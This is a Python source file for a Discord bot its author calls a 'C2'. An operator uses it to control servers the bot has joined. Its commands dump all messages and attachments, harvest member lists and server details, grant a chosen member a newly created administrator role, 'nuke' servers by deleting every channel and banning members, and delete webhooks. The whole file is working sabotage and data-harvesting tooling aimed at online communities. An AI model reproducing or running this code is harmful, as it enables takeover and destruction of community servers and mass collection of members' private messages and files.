import discord 
import asyncio 
from colorama import Fore, Style
import os

intents = discord.Intents.all()

intents.messages = True
intents.guilds = True
intents.members = True
intents.message_content = True

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'Logged on as {client.user}')
    print("Servers the c2 is in:")
    for guild in client.guilds:
        print(f'{guild.name} (ID: {guild.id})')
    client.loop.create_task(loop())

async def leave():
    for guild in client.guilds:
        await guild.leave()
    print("Left all servers.")

async def dump(*args):
    if '--all' in args:
        for guild in client.guilds:
            await dump_guild(guild)
        print("Dumped all servers.")
    else:
        guild_id = args[0]
        guild = discord.utils.get(client.guilds, id=int(guild_id))
        if not guild:
            print(f"No server found with ID: {guild_id}")
            return
        await dump_guild(guild)
        print(f"Dumped server {guild.name}.")

async def dump_guild(guild):
    file_name = f'{guild.id}_messages.txt'
    with open(file_name, 'w', encoding='utf-8') as f:
        for channel in guild.text_channels:
            await dumpler(channel, f)
        for thread in guild.threads:
            await dumpler(thread, f)
    print(f"Messages dumped from server {guild.name}")

async def dumpler(channel, file):
    try:
        async for message in channel.history(limit=None):
            file.write(f'{message.created_at} - {message.author} (ID: {message.author.id}): {message.content}\n')
            for attachment in message.attachments:
                file.write(f'ATTACHMENT: {attachment.url}\n')
    except Exception as e:
        print(f"Couldn't read messages from {channel.name}: {e}")

async def recon(*args):
    if '--all' in args:
        for guild in client.guilds:
            await recon_guild(guild)
        print("----------------------------------------")
    else:
        guild_id = args[0]
        guild = discord.utils.get(client.guilds, id=int(guild_id))
        if not guild:
            print(f"No server found with ID: {guild_id}")
            return
        await recon_guild(guild)
        print(f"Recon info from server {guild.name}.")

async def recon_guild(guild):
    print(f"Recon for {guild.name} (ID: {guild.id}):")
    print(f"Owner: {guild.owner} (ID: {guild.owner.id})")
    print(f"Creation Date: {guild.created_at}")
    print(f"Total Members: {guild.member_count}")
    print(f"Boosts: {guild.premium_subscription_count}")
    servidinfo(guild)
    print("Recon complete.")

def servidinfo(guild):
    print("Roles:")
    for role in guild.roles:
        print(f' - {role.name} (ID: {role.id})')
    print("Channels:")
    for channel in guild.channels:
        channel_type = 'Text' if isinstance(channel, discord.TextChannel) else 'Voice'
        print(f' - {channel.name} ({channel_type}, ID: {channel.id})')
    print("Members:")
    client.loop.create_task(members(guild))

async def members(guild):
    async for member in guild.fetch_members(limit=None):
        roles = ', '.join([role.name for role in member.roles])
        print(f' - {member} (ID: {member.id}), Roles: {roles}, Joined: {member.joined_at}, Status: {member.status}')

async def sendmsg(guild_id, message):
    guild = discord.utils.get(client.guilds, id=int(guild_id))
    if not guild:
        print(f"No server found with ID: {guild_id}")
        return
    
    for channel in guild.text_channels:
        try:
            await channel.send(f'@everyone {message}')
            print(f'Message sent to {channel.name}')
            break
        except Exception as e:
            print(f"Couldn't send message to {channel.name}: {e}")

async def memberlist(*args):
    if '--all' in args:
        for guild in client.guilds:
            await memberlist_guild(guild)
        print("----------------------------------------")
    else:
        guild_id = args[0]
        guild = discord.utils.get(client.guilds, id=int(guild_id))
        if not guild:
            print(f"No server found with ID: {guild_id}")
            return
        await memberlist_guild(guild)
        print(f"Member list from server {guild.name}.")

async def memberlist_guild(guild):
    print(f'Members in {guild.name}:')
    async for member in guild.fetch_members(limit=None):
        print(f'{member.name}#{member.discriminator} (ID: {member.id})')

async def inv(guild_id):
    guild = discord.utils.get(client.guilds, id=int(guild_id))
    if not guild:
        print(f"No server found with ID: {guild_id}")
        return
    
    for channel in guild.text_channels:
        try:
            invite = await channel.create_invite(max_age=300, max_uses=1)
            print(f'Invite created: {invite.url}')
            break
        except Exception as e:
            print(f"Couldn't create invite in {channel.name}: {e}")

async def escalatemod(guild_id, identifier):
    guild = discord.utils.get(client.guilds, id=int(guild_id))
    if not guild:
        print(f"No server found with ID: {guild_id}")
        return
    
    if identifier.isdigit():
        member = guild.get_member(int(identifier))
    else:
        member = discord.utils.get(guild.members, name=identifier)
    
    if not member:
        print(f"No member found with ID: {identifier}")
        return
    
    role = discord.utils.get(guild.roles, name='mod')
    if not role:
        try:
            role = await guild.create_role(name='mod', permissions=discord.Permissions(administrator=True))
            print("Created mod role.")
        except Exception as e:
            print(f"Failed to create mod role: {e}")
            return
    
    try:
        await member.add_roles(role)
        print(f"Gave mod to {member}.")
    except Exception as e:
        print(f"Couldn't give {member} mod: {e}")

async def nuke(*args):
    if '--all' in args:
        for guild in client.guilds:
            await nukserv(guild)
        print("Nuked all servers.")
    else:
        guild_id = args[0]
        guild = discord.utils.get(client.guilds, id=int(guild_id))
        if not guild:
            print(f"No server found with ID: {guild_id}")
            return
        await nukserv(guild)
        print(f"Nuked server {guild.name}.")

async def nukserv(guild):
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"Deleted channel: {channel.name}")
        except Exception as e:
            print(f"Failed to delete channel {channel.name}: {e}")
    
    for member in guild.members:
        if guild.owner_id != member.id and not member.guild_permissions.administrator:
            try:
                await guild.ban(member)
                print(f"Banned member: {member.name}#{member.discriminator}")
            except Exception as e:
                print(f"Couldn't ban member {member.name}#{member.discriminator}: {e}")

if not os.path.exists('dumps'):
    os.mkdir('dumps')

async def dumpatts(*args):
    if '--all' in args:
        for guild in client.guilds:
            await dumpguild(guild)
        print("Dumped all attachments!")
    else:
        guild_id = args[0]
        guild = discord.utils.get(client.guilds, id=int(guild_id))
        if not guild:
            print(f"No server found with ID: {guild_id}")
            return
        await dumpguild(guild)
        print(f"Dumped all attachments from server {guild.name}.")

async def dumpguild(guild):
    for channel in guild.text_channels:
        await dumpchan(channel)
    for thread in guild.threads:
        await dumpchan(thread)

async def dumpchan(channel):
    try:
        async for message in channel.history(limit=None):
            for attachment in message.attachments:
                await download_attachment(attachment)
    except Exception as e:
        print(f"Couldn't dump attachments from {channel.name}: {e}")

async def download_attachment(attachment):
    base_name, ext = os.path.splitext(attachment.filename)
    file_path = os.path.join('dumps', attachment.filename)

    counter = 1
    while os.path.exists(file_path):
        file_path = os.path.join('dumps', f"{base_name} ({counter}){ext}")
        counter += 1

    try:
        await attachment.save(file_path)
        print(f"downloaded {file_path}")
    except Exception as e:
        print(f"failed to download {attachment.filename}: {e}")

async def usage(command=None):
    usage_info = {
        '!DUMP': '<server_id> [--all] - Dump messages from channels of a server or all servers.',
        '!RECON': '<server_id> [--all] - Get info for a server or all servers.',
        '!MEMBERLIST': '<server_id> [--all] - List members of a server or all servers.',
        '!NUKE': '<server_id> [--all] - Delete all channels and ban members in a server or all.',
        '!INV': '<server_id> - Create an invite link for a server.',
        '!MOD': '<server_id> <member_id|member_name> - Grant "mod" role to a member.',
        '!LEAVE': '- Make the bot leave all servers.',
        '!DUMPATTS': '<server_id> [--all] - Dump all attachments from a server or all.',
        '!DELHOOKS': '<server_id> [--all] - Delete all webhooks in a server or all.',
    }
    
    if command:
        print(Fore.MAGENTA + command + Style.RESET_ALL + ": " + usage_info.get(command.upper(), "No usage info available for this command."))
    else:
        print(Fore.YELLOW + "Usage Information:" + Style.RESET_ALL)
        for cmd, desc in usage_info.items():
            print(Fore.BLUE + cmd + Style.RESET_ALL + ": " + desc)

async def delhooks(*args):
    if '--all' in args:
        for guild in client.guilds:
            await delwebinsrv(guild)
        print("Deleted webhooks in all servers.")
    else:
        guild_id = args[0]
        guild = discord.utils.get(client.guilds, id=int(guild_id))
        if not guild:
            print(f"No server found with ID: {guild_id}")
            return
        await delwebinsrv(guild)
        print(f"Deleted webhooks in server {guild.name}.")

async def delwebinsrv(guild):
    webhooks = []
    for channel in guild.text_channels:
        try:
            webhooks_in_channel = await channel.webhooks()
            webhooks.extend(webhooks_in_channel)
        except Exception as e:
            print(f"Failed to get webhooks from {channel.name}: {e}")
    
    if not webhooks:
        print(f"No webhooks found in server {guild.name}.")
        return
    
    for webhook in webhooks:
        try:
            await webhook.delete()
            print(f"Deleted webhook: {webhook.name}")
        except Exception as e:
            print(f"Failed to delete webhook {webhook.name}: {e}")

async def loop():
    commands = {
        '!LEAVE': leave,
        '!DUMP': dump,
        '!RECON': recon,
        '!MESSAGE': sendmsg,
        '!MEMBERLIST': memberlist,
        '!INV': inv,
        '!MOD': escalatemod,
        '!NUKE': nuke,
        '!USAGE': usage,
        '!DUMPATTS': dumpatts,
        '!DELHOOKS': delhooks 
    }

    while True:
        command = input("Enter command: ").strip()
        if not command:
            continue 
        parts = command.split()
        if not parts:
            continue 
        cmd = parts[0].upper()

        if cmd in commands:
            args = parts[1:]
            await commands[cmd](*args)
        else:
            print("Unknown command, use !USAGE for help!")

async def main():
    token = input("Enter C2 token: ")
    try:
        await client.start(token)
    except Exception as e:
        await client.close()
        print("Improper token has been passed!")

if __name__ == "__main__":
    asyncio.run(main())
